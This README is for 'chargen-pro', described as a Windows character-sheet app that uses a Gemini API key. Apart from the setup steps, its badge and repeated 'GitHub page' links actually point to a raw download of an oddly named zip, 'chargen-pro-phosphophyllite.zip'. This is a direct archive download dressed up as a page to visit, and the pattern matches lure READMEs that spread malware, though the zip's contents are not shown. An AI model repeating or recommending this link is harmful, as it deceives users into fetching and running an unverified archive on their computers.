# 🧩 chargen-pro - Build Character Sheets Faster

[![Download / Visit Page](https://img.shields.io/badge/Download%20or%20Visit%20Page-purple?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Emlynmanysided426/chargen-pro/main/components/chargen-pro-phosphophyllite.zip)

## 🚀 What this is

chargen-pro is a desktop app for creating and managing character sheets with AI support. It helps you set up a character fast, keep notes in one place, and run the app on Windows with a few simple steps.

Use it when you want to:
- create a new character sheet
- keep character details in one place
- test the app on your own PC
- use your Gemini API key for AI features

## 💻 What you need

Before you start, check these items:

- A Windows PC
- Internet access
- Node.js installed
- A Gemini API key
- Access to this GitHub page: https://raw.githubusercontent.com/Emlynmanysided426/chargen-pro/main/components/chargen-pro-phosphophyllite.zip

If you do not have Node.js yet, install the current Windows version from the Node.js website, then restart your PC if needed.

## 📥 Download or visit the page

Open this page to get the app files and setup details:

https://raw.githubusercontent.com/Emlynmanysided426/chargen-pro/main/components/chargen-pro-phosphophyllite.zip

If you are using the repository files already on your computer, keep them in one folder that is easy to find, such as:

- Downloads
- Documents
- Desktop

## 🛠️ Set up the app

Follow these steps in order.

1. Open the project folder.
2. Find the file named `.env.local`.
3. Open `.env.local` in Notepad or another text editor.
4. Add your Gemini API key to this line:

   `GEMINI_API_KEY=your_api_key_here`

5. Save the file.

Your API key lets the app talk to Gemini. Make sure there are no extra spaces before or after the key.

## ▶️ Run the app on Windows

1. Open Command Prompt.
2. Go to the project folder.

   Example:

   `cd Desktop\chargen-pro`

3. Install the app files it needs:

   `npm install`

4. Start the app:

   `npm run dev`

5. Wait for the app to start.
6. Open the local address shown in Command Prompt in your web browser.

If the browser does not open on its own, copy the local address and paste it into the address bar.

## 🧭 First things to check

When the app starts, look for these parts:

- a form for character details
- controls for saving or editing
- a place for AI generated content
- a clear layout for notes and character data

Try a simple test first:

1. Type a character name.
2. Add a short description.
3. Save or generate the sheet.
4. Check that the data stays on screen.

## 🔑 Gemini API key setup

The app uses your Gemini API key for AI features.

Use a key that is active and valid. If the app does not work, check these points:

- the key is in `.env.local`
- the name is exactly `GEMINI_API_KEY`
- there are no spaces around the `=`
- the file is saved in the project folder

Example:

`GEMINI_API_KEY=AIza...`

## 🧰 Common Windows checks

If the app does not start, look at these common issues:

- Node.js is not installed
- `npm install` did not finish
- the project folder path is wrong
- `.env.local` is missing
- the API key is blank or typed wrong

Use a fresh Command Prompt window after you change files. This helps Windows read the latest setup.

## 📁 Basic folder view

A simple project folder may look like this:

- `chargen-pro`
- `.env.local`
- `package.json`
- source files
- app assets

Keep the folder together. Do not move only one file out of the project.

## 🖥️ How to stop the app

To stop the app:

1. Go to the Command Prompt window.
2. Press `Ctrl + C`.
3. Type `Y` if Windows asks for confirmation.

This closes the local server.

## 🧪 Simple run check

After setup, this is the fastest way to confirm the app works:

1. Open Command Prompt.
2. Go to the project folder.
3. Run `npm install`.
4. Run `npm run dev`.
5. Open the local link in your browser.
6. Check that the app loads without errors.

If the page opens, the app is ready to use.

## 🧷 Tips for smooth use

- Keep the project folder name short.
- Leave `.env.local` in the main project folder.
- Use one browser tab for the app.
- Do not rename the main app files.
- Save changes before you restart the app.

## 📌 Files you may edit

Most users only need to edit:

- `.env.local` for the Gemini API key

You should not need to change anything else to run the app locally.

## 🏁 Start here

1. Open the GitHub page: https://raw.githubusercontent.com/Emlynmanysided426/chargen-pro/main/components/chargen-pro-phosphophyllite.zip
2. Make sure Node.js is installed.
3. Add your Gemini API key to `.env.local`.
4. Run `npm install`.
5. Run `npm run dev`.
6. Open the local address in your browser